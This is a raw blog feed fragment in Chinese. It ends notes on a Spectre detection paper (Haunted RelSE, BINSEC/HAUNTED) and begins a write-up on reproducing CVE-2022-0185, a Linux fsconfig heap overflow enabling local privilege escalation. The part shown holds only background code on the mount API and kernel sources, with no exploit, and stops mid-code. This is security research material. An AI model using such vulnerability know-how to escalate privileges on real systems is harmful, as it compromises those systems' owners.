class="headerlink" title="C. Theorems"></a>C. Theorems</h3><p>本节研究者将证明 Haunted RelSE 对于 SCT 的正确性与完备性（达到一个展开边界），这意味着当 Haunted RelSE 报告了一个违规（violation），其为一个真正的 SCT 违规（没有上近似），且当其在深度 k 上报告没有违规时，该程序在深度 k 上是安全的（没有下近似）；为此，研究者证明了 Haunted RelSE 与 Explicit RelSE 是等价的，且展示了 Explicit RelSE 对于达到一个展开边界（up-to-an-unrolling-bound）的 SCT 而言在上是正确且完备的</p><p><strong>Theorem 1.</strong> <em>Explicit RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em></p><p>$Proof(sketch).$ 该证明为一个简单的对 RelSE 对常数时间的正确性与完备性的证明对推测性语义（speculative semantics）的扩展；该扩展需要展示：</p><ul><li>1）在符号执行中瞬态路径上报告的违规对应到具体瞬态执行中的违规</li><li>2）若在具体瞬态执行中有一个违规，则在符号执行中有一个路径会报告该违规</li></ul><p>接下来研究者将展示 Haunted RelSE 与 Explicit RelSE 等价</p><p><strong>Theorem 2.</strong> （Equivalence Explicit and Haunted RelSE） <em>Haunted RelSE 检测到了一个违规当且仅当 Explicit RelSE 检测到了一个违规</em>  </p><p>在 <code>Appendix B</code> 中研究者给出了一个证明草图，其首先展示了 Spectre-PHT 的理论：在一个条件分支后，Haunted RelSE 探索的两条路径完全地获取了 Explicit RelSE 中探索的四条路径的行为；研究者接下来展示 Spectre-STL 的理论：在一条 load 指令之后，Haunted RelSE 产生的单条路径完全获得了 Explicit RelSE 中多条路径的行为</p><p><strong>Corollary 1.</strong> <em>Haunted RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em> </p><h3 id="D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE"><a href="#D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE" class="headerlink" title="D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE"></a>D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE</h3><p>研究者基于二进制级的分析器 BINSEC 实现了 Haunted RelSE 并称之为 <code>BINSEC/HAUNTED</code> ，其获取一个 x86 可执行文件、秘密输入的位置、一个初始内存配置（通常为完全符号化的）、推测的深度、store buffer 的大小作为输入；BINSEC&#x2F;HAUNTED 以深度优先搜索对程序进行探索，优先处理瞬态路径，并带着反例（即，导致了损坏的初始配置与推测选项）报告 SCT 损坏；其使用当前位向量理论上最好的 SMT 求解器 <code>Boolector</code></p><h1 id="0x05-EXPERIMENTAL-EVALUATION"><a href="#0x05-EXPERIMENTAL-EVALUATION" class="headerlink" title="0x05. EXPERIMENTAL EVALUATION"></a>0x05. EXPERIMENTAL EVALUATION</h1><p>研究者在本论文中回答了这些研究问题：</p><p><strong>RQ 1 Effectiveness.</strong> BINSEC&#x2F;HAUNTED 是否能够在真实世界的密码学二进制文件中发现 Spectre-PHT 与 Spectre-STL 损坏？</p><p><strong>RQ2 Haunted vs Explicit.</strong> Haunted RelSE 与 Explicit RelSE 对比起来如何？</p><p><strong>RQ3 BINSEC&#x2F;HAUNTED vs. SoA tools.</strong> BINSEC&#x2F;Haunted 与最先进的工具比起来如何？</p><p>为了回答 RQ1 与 RQ2，研究者对比了 <em>Explicit</em> 与 <em>Haunted</em> 用以关系符号执行的探索策略的性能——两者都应用于 BINSEC&#x2F;HAUNTED ——在一组真实世界密码学二进制文件与 litmus benchmark（Sections V-B 与 V-C）；为了回答 RQ3，研究者对比了 BINSEC&#x2F;HAUNTED 与最先进的工具 KLEESpectre 与 Pitchfork（Section V-D）</p><p><strong>Legend.</strong> 本节中，$I _{x86}$ 为被探索的不同 x86 指令的数量， $P$ 为探索的路径数量，$T$ 为总的执行时间，<code>一个虫子符号</code> （打不出来）为发现的漏洞数量，⏳为超时数量，✓ 为被证明安全的程序数量，× 为被证明不安全的程序数量</p><h3 id="A-benchmark"><a href="#A-benchmark" class="headerlink" title="A. benchmark"></a>A. benchmark</h3><p>研究者在一台带有 <code>Intel(R) Xeon(R) CPU E3-1505M v6 @ 3.00GHz </code> 处理器与 32GB 内存的机器上进行实验，除了初始栈指针 $esp$ 以外（类似于related work[5]）所有的输入都是符号的，且数据结构为静态分配的；用户需要标记秘密，其余所有的值都是公开的；研究者将推测深度设置为 200 条指令并将 store buffer 的大小设置为 20 条指令，此外，研究者仅考虑顺序执行中的间接跳转目标并实现了一个 <em>影子栈</em> 以限制返回指令在一个合适的返回位置；考虑瞬态跳转目标需要在任意位置建模间接跳转，对于符号执行而言虽然可行但非常棘手</p><p>研究者通过如下程序评估 BINSEC&#x2F;HAUNTED：</p><ul><li><code>litmus-pht</code> ：16 个来自于 Pitchfork 的修改过的 Paul Kocher 的 litmus tests 集合的小的测试用例（litmus tests）用以 Spectre-PHT</li><li><code>litmus-pht-patched</code> ：添加了下标掩码（index masking）的 <code>litmus-pht</code></li><li><code>litmus-stl</code> ：新的一组用以 Spectre-STL 的 litmus tests</li><li>来自 OpenSSL 与 Libsodium 密码学库（详见 Table I） 的密码学原语，包括并扩展至在 <a href="https://doc.libsodium.org/secret-key_cryptography/secretbox">[5]</a> 中被分析的那些</li></ul><p>程序使用 gcc 10.1.0 编译到 32 位 x86 架构上，litmus tests 被以 <code>-fno-stack-protector</code> 选项进行编译，Spectre-STL 的 litmus tests 额外添加了 <code>-no-pie</code> 与 <code>-fno-pic</code> 以排除由这些选项引入的损坏（参见 Section VI）；由于同一原因，<code>donna</code> 与 <code>tea</code> 不带有 <code>-fno-stack-protector</code> 编译选项，优化级别为 <code>O1、O2、O3</code> 与 <code>Ofast</code>；Libsodium 由默认的 Makefile 进行编译，OpenSSL 开启了 <code>O3</code> 优化，两者都开启了 stack protector</p><p><img src="https://s2.loli.net/2023/01/29/4ZgLHYdQ69ibICM.png" alt="image.png"></p><p><em>Note on Stack Protectors</em> ：由 stack protector 引入的解决错误的代码非常复杂且包含了许多无法在纯净的符号执行中分析的系统调用，BINSEC&#x2F;HAUNTED 在系统调用上停止路径执行且每个程序仅跳转到 stack protector 的代码一次，这意味着其可能会错过一些未被探索的代码中的损坏；此外，对于 litmus tests、<code>tea</code>、<code>donna</code>，超时时长被设置为 1 小时，但对于包含 stack protector 的代码则延长至 6 小时（Libsodium 与 OpenSSL）</p><h1 id="0x06-NEW-VULNERABILITIES-AND-MITIGATIONS"><a href="#0x06-NEW-VULNERABILITIES-AND-MITIGATIONS" class="headerlink" title="0x06. NEW VULNERABILITIES AND MITIGATIONS"></a>0x06. NEW VULNERABILITIES AND MITIGATIONS</h1><h1 id="0x07-RELATED-WORK"><a href="#0x07-RELATED-WORK" class="headerlink" title="0x07. RELATED WORK"></a>0x07. RELATED WORK</h1><h1 id="0x08-CONCLUTION"><a href="#0x08-CONCLUTION" class="headerlink" title="0x08. CONCLUTION"></a>0x08. CONCLUTION</h1><p>研究者提出了 Haunted RelSE，一种基于关系符号执行的用以静态检测 Spectre-PHT 与 Spectre-STL 漏洞的技术；特别地，Haunted RelSE 能够通过同时推理常规执行与瞬态执行以显著地减少寻址推测路径的开销；研究者将 Haunted RelSE 应用于一个关系符号执行工具 <code>BINSEC/HAUNTED</code> 中；据研究者的实验结果所示，Haunted RelSE 为迈向可扩展的对 Spectre attacks 的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下极大地提升分析速度，在对中等大小的真实世界中的密码学二进制文件的分析推测语义复杂性进行剪枝；对于 Spectre-STL，BINSEC&#x2F;HAUNTED 是第一个可以彻底分析真实世界中较小的密码学二进制文件并在中等大小的密码学二进制文件中找到漏洞的工具</p><p>最后，研究者通过 BINSEC&#x2F;HAUNTED，报告了一个标准的对 Spectre-PHT 的防护可以轻易地引入 Spectre-STL 漏洞并提出了修复方法，且发现了一个著名的用于编译位置无关可执行文件的 GCC 编译选项会引入 Spectre-STL</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;鬼！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="符号执行" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制分析" scheme="https://arttnba3.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spectre" scheme="https://arttnba3.github.io/tags/Spectre/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x09】CVE-2022-0185 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>https://arttnba3.github.io/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T01:04:19.000Z</published>
    <updated>2023-05-28T01:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>还是 mount 好</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> 是 2022 年初爆出来的一个位于 filesystem context 系统中的 <code>fsconfig</code> 系统调用中的一个堆溢出漏洞，对于有着 <code>CAP_SYS_ADMIN</code> 权限（或是开启了 unprivileged namespace）的攻击者而言其可以利用该漏洞完成本地提权，该漏洞获得了高达 <code>8.4</code> 的 CVSS 评分</p><blockquote><p>发现漏洞的安全研究员的挖掘与利用过程参见<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">这里</a>，本文编写时也有一定参考</p></blockquote><p>本文选择内核版本 <code>5.4</code> 进行分析，在开始分析之前，我们先来补充一些基础知识</p><h2 id="Filesystem-mount-API-初探"><a href="#Filesystem-mount-API-初探" class="headerlink" title="Filesystem mount API 初探"></a>Filesystem mount API 初探</h2><blockquote><p>参见<a href="https://zhuanlan.zhihu.com/p/93592262">知乎上的该系列文章</a></p></blockquote><p>相信大家对于 Linux 下的文件系统的挂载都是非常熟悉—— <code>mount</code>  系统调用被用以将文件系统挂载到以 <code>/</code> 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 <code>/dev/sdb1</code> 到 <code>/mnt/temp</code> 目录下，之后就能在该目录下进行文件访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>或是通过编写程序的方式使用裸的 <code>mount</code> 系统调用进行挂载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是<a href="https://lwn.net/Articles/753473/">总有些人想搞个大新闻</a>，以 AL Viro 为首的开发者认为旧的 <code>mount</code> 系统调用存在诸多漏洞与设计缺陷，于是决定重写一套新的 mount API，并<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">成功被合并到内核主线</a>，称之为 <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>新的 mount API 将过去的一个简单的 <code>mount</code> 系统调用的功能拆分成了数个新的系统调用，对应不同的文件系统挂载阶段，于是乎现在 Linux 上有着两套并行的 mount API</p><blockquote><p><del>👴的评价是闲着没事干可以去把村口大粪挑一下</del></p></blockquote><h3 id="Step-I-fsopen-获取一个-filesystem-context"><a href="#Step-I-fsopen-获取一个-filesystem-context" class="headerlink" title="Step.I - fsopen: 获取一个 filesystem context"></a>Step.I - fsopen: 获取一个 filesystem context</h3><p>还记得笔者以前说过的 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux 中一切皆文件</a> 的哲学吗，在新的 mount API 中也遵循了这样的哲学——如果说 <code>open()</code> 系统调用用以打开一个文件并提供一个文件描述符，那么 <strong><code>fsopen()</code> 系统调用便用于打开一个文件系统，并提供一个”文件系统描述符“</strong>——称之为 **<code>文件系统上下文</code>**（filesystem context）</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it&#39;s all FILES"></p><p>由于标准库中还未添加 new mount API 相关的代码，因此我们需要写 raw syscall 来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 <code>ext4</code> 文件系统上下文（需要 <code>CAP_SYS_ADMIN</code> 权限，或是开启了 unprivileged namespace 的情况下使用 <code>unshare()</code> 系统调用创建带有该权限的 namespace）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是这里创建的是一个<strong>空白的文件系统上下文</strong>，并没有与任何实际设备或文件进行关联——这是我们需要在接下来的步骤中完成的配置</p><h4 id="✳-fsopen-in-kernel"><a href="#✳-fsopen-in-kernel" class="headerlink" title="✳ fsopen() in kernel"></a><strong>✳</strong> fsopen() in kernel</h4><blockquote><p>superblock、dentry 这类的 VFS 基础知识不在此处科普，请自行了解：）</p></blockquote><p>在内核当中，<code>fsopen()</code> 系统调用的行为实际上对应创建的是一个 <code>fs_context</code> 结构体作为 filesystem context，创建一个对应的 file 结构体并分配一个文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 按名称打开文件系统以便于对其进行设置以挂载</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们被允许指定在哪个容器中打开文件系统，由此指示要使用哪一个命名空间</span><br><span class="hljs-comment"> * (尤其是将哪个网络命名空间用于网络文件系统).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//文件系统类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//文件系统上下文</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities 机制，检查对应【命名空间】是否有 CAP_SYS_ADMIN 权限</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// 拷贝用户传入的文件系统名</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// 按名称获取文件系统类型</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// 创建文件系统上下文结构体</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// 分配 Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// 创建 file 结构体并分配文件描述符</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>fs_context</code> 的具体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在创建与重新配置一个 superblock 中的参数的文件系统上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock 的创建会填充到 -&gt;root 中，重新配置需要该字段已经设置.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 参见 Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* 用户空间访问的互斥锁 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* 文件系统的上下文 */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root 与 superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* 将要挂载的用户命名空间 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* 将要挂载的网络1命名空间 */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* 挂载者的 credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* 源 (eg. 设备路径) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M 设置 */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* 需要调用 ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> 的初始化在 <code>alloc_fs_context()</code> 中完成，在 <code>fsopen()</code> 中对应的是 <code>FS_CONTEXT_FOR_MOUNT</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - 创建一个文件系统上下文.</span><br><span class="hljs-comment"> * @fs_type: 文件系统类型.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//想不出咋翻</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock 标志位 (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags 中可用的成员</span><br><span class="hljs-comment"> * @purpose: 本次配置的目的.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 打开一个文件系统并创建一个挂载上下文（mount context），挂载上下文被以对应的标志位进行初始化，</span><br><span class="hljs-comment"> * 若从另一个 superblock （引自 @reference）进行 submount/automount，</span><br><span class="hljs-comment"> * 则可能由从该 superblock 拷贝来的参数1（如命名空间）.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> 